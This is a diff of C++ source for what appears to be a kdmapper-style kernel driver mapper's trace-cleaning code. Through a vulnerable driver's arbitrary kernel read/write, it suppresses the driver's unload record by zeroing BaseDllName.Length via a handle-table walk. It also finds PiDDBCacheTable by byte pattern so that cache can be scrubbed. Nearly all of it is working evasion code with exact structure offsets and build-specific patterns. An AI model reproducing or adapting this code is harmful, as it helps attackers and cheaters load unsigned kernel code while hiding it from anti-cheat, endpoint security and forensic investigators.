@@ -5,6 +5,7 @@
 
 #include "log.h"
 #include "nal.h"
+#include "nt.h"
 
 namespace
 {
@@ -216,6 +217,7 @@ namespace trace
     bool     g_unloadedScanned = false;
     uint64_t g_piddbTable = 0;
     bool     g_piddbScanned = false;
+    bool     g_piddbByPattern = false;
 
     constexpr uint64_t kChunk = 0x10000;
     constexpr uint32_t kMaxCandidates = 256;
@@ -463,7 +465,10 @@ namespace trace
             const uint64_t span =
                 (size - offset < kChunk + length) ? size - offset : kChunk + length;
 
-            if (!nal::ReadMemory(base + offset, chunk.data(), span))
+            /* Mapped before the read: a chunk over a gap faults in the host's own
+             * copy, where user-mode SEH cannot reach it. */
+            if (!Mapped(base + offset, span) ||
+                !nal::ReadMemory(base + offset, chunk.data(), span))
                 continue;
 
             for (uint64_t i = 0; i + length <= span; ++i)
@@ -521,6 +526,119 @@ namespace trace
             return 0;
 
         return size;
+    }
+
+    /*
+     * Clears the unload record the kernel would otherwise write for the host.
+     *
+     * kdmapper's route, and the reason it beats scanning: nothing here is guessed.
+     * Walk our own handle table entry for the device, follow FILE_OBJECT ->
+     * DeviceObject -> DriverObject -> DriverSection, and zero the LDR entry's
+     * BaseDllName.Length. MiRememberUnloadedDriver skips any driver whose
+     * BaseDllName length is zero, so the record is never written - there is no
+     * array to locate and no candidate to false-positive on, which is exactly what
+     * produced three bugchecks.
+     *
+     * Offset-free apart from ABI-stable structure fields, so it does not drift with
+     * a kernel build.
+     */
+    bool CleanUnloadRecord()
+    {
+        if (nal::hDevice == INVALID_HANDLE_VALUE)
+            return false;
+
+        /*
+         * Retried, like kdmapper does: the handle table grows between the sizing
+         * call and the real one, so a single attempt with slack loses the race
+         * whenever anything in the system opens a handle. Bounded so a pathological
+         * table cannot spin here.
+         */
+        ULONG needed = 0;
+        std::vector<uint8_t> buffer;
+        NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;
+
+        for (int attempt = 0; attempt < 8; ++attempt)
+        {
+            status = nt::NtQuerySystemInformation(
+                (SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, nullptr, 0,
+                &needed);
+
+            if (status != STATUS_INFO_LENGTH_MISMATCH || !needed)
+                return false;
+
+            buffer.assign((size_t)needed + 0x2000, 0);
+
+            status = nt::NtQuerySystemInformation(
+                (SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation,
+                buffer.data(), (ULONG)buffer.size(), &needed);
+
+            if (NT_SUCCESS(status))
+                break;
+        }
+
+        if (!NT_SUCCESS(status))
+            return false;
+
+        const auto* info = (nt::PSYSTEM_HANDLE_INFORMATION_EX)buffer.data();
+        uint64_t object = 0;
+
+        for (ULONG_PTR i = 0; i < info->HandleCount; ++i)
+        {
+            const nt::SYSTEM_HANDLE& handle = info->Handles[i];
+
+            if (handle.UniqueProcessId != (HANDLE)(ULONG_PTR)GetCurrentProcessId())
+                continue;
+
+            if (handle.HandleValue == nal::hDevice)
+            {
+                object = (uint64_t)handle.Object;
+                break;
+            }
+        }
+
+        if (!object)
+            return false;
+
+        /* FILE_OBJECT -> DeviceObject -> DriverObject -> DriverSection. */
+        uint64_t device = 0;
+        uint64_t driver = 0;
+        uint64_t section = 0;
+
+        if (!nal::ReadMemory(object + 0x08, &device, sizeof(device)) || !device)
+            return false;
+
+        if (!nal::ReadMemory(device + 0x08, &driver, sizeof(driver)) || !driver)
+            return false;
+
+        if (!nal::ReadMemory(driver + 0x28, &section, sizeof(section)) || !section)
+            return false;
+
+        /* BaseDllName sits at 0x58 in KLDR_DATA_TABLE_ENTRY, the same offset our own
+         * KM_LDR_ENTRY asserts. */
+        if (!Mapped(section + 0x58, 0x10))
+            return false;
+
+        UNICODE_STRING name = { 0 };
+
+        if (!nal::ReadMemory(section + 0x58, &name, sizeof(name)) || !name.Length)
+            return false;
+
+        std::wstring text(name.Length / sizeof(wchar_t), L'\0');
+
+        if (name.Buffer && Mapped((uint64_t)name.Buffer, name.Length) &&
+            nal::ReadMemory((uint64_t)name.Buffer, &text[0], name.Length))
+            ;
+        else
+            text.assign(L"(unreadable)");
+
+        /* Only the length is zeroed; that is the field MiRememberUnloadedDriver tests. */
+        const USHORT zero = 0;
+
+        if (!nal::WriteMemory(section + 0x58, (void*)&zero, sizeof(zero)))
+            return false;
+
+        km_log::Good("unload record suppressed for %ls", text.c_str());
+        return true;
     }
 
     int ScrubUnloadedDrivers(const std::wstring& imageName)
@@ -600,6 +718,49 @@ namespace trace
         return cleared;
     }
 
+    /*
+     * Locates PiDDBCacheTable by byte pattern, the way kdmapper does.
+     *
+     * The shape scan below has never once succeeded on this machine, whereas the
+     * pattern route is exactly what kdmapper ships and maintains per kernel build -
+     * it carries a second pattern specifically annotated "update for build
+     * 26100.1000", which is the build here. A pattern finds the instruction that
+     * references the table and resolves the RIP-relative displacement out of it, so
+     * the answer is exact instead of inferred from whatever happens to sit nearby.
+     *
+     * Patterns still drift, so the current and pre-26100 shapes are both tried and
+     * the caller keeps the scan as a fallback.
+     */
+    uint64_t FindPiddbByPattern(uint64_t kernelBase)
+    {
+        const uint32_t size = ImageSize(kernelBase);
+
+        if (!size)
+            return 0;
+
+        /* 66 03 D2 48 8D 0D - `lea rcx,[rip+x]`, displacement six bytes in. */
+        static const uint8_t current[] = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };
+        /* 48 8B F9 33 C0 48 8D 0D - the shape before 26100, same offset. */
+        static const uint8_t earlier[] = { 0x48, 0x8B, 0xF9, 0x33, 0xC0, 0x48, 0x8D, 0x0D };
+
+        uint64_t hit = FindPatternInImage(kernelBase, size, current, "xxxxxx");
+
+        if (!hit)
+            hit = FindPatternInImage(kernelBase, size, earlier, "xxxxxxxx");
+
+        if (!hit)
+            return 0;
+
+        /* `lea rcx,[rip+disp32]` starts two bytes into the match and ends ten bytes
+         * in, which is where the displacement is measured from. */
+        const uint64_t table = Relative(hit + 2, 6, 10);
+
+        if (!table || !Mapped(table, 0x80))
+            return 0;
+
+        return table;
+    }
+
     int ScrubPiddbCache(const std::wstring& imageName)
     {
         const std::wstring wanted = BaseName(imageName);
@@ -618,13 +779,28 @@ namespace trace
         {
             if (!g_piddbScanned)
             {
-                g_piddbTable = FindPiddbTable(kernelBase);
+                g_piddbTable = FindPiddbByPattern(kernelBase);
+                g_piddbByPattern = g_piddbTable != 0;
+
+                if (g_piddbTable)
+                {
+                    km_log::Step("PiDDBCacheTable found by pattern at 0x%llX",
+                                 (unsigned long long)g_piddbTable);
+                }
+                else
+                {
+                    g_piddbTable = FindPiddbTable(kernelBase);
+                }
+
                 g_piddbScanned = true;
             }
 
             table = g_piddbTable;
 
-            if (table)
+            /* Only say "by scan" when it really came from the scan - the pattern
+             * route already logged itself, and re-running it here would cost a full
+             * image scan just to choose a message. */
+            if (table && !g_piddbByPattern)
                 km_log::Step("PiDDBCacheTable found by scan at 0x%llX",
                              (unsigned long long)table);
         }
@@ -850,7 +1026,16 @@ namespace trace
 
     void Scrub(const std::wstring& imageName)
     {
-        const int unloaded = ScrubUnloadedDrivers(imageName);
+        /*
+         * Preferred route: stop the record being written at all. The array scrub is
+         * the fallback, kept because the handle walk needs an open device and a
+         * readable object chain.
+         */
+        int unloaded = CleanUnloadRecord() ? 1 : 0;
+
+        if (!unloaded)
+            unloaded = ScrubUnloadedDrivers(imageName);
+
         const int cached = ScrubPiddbCache(imageName);
         const int hashed = ScrubHashBucketList(imageName);
 
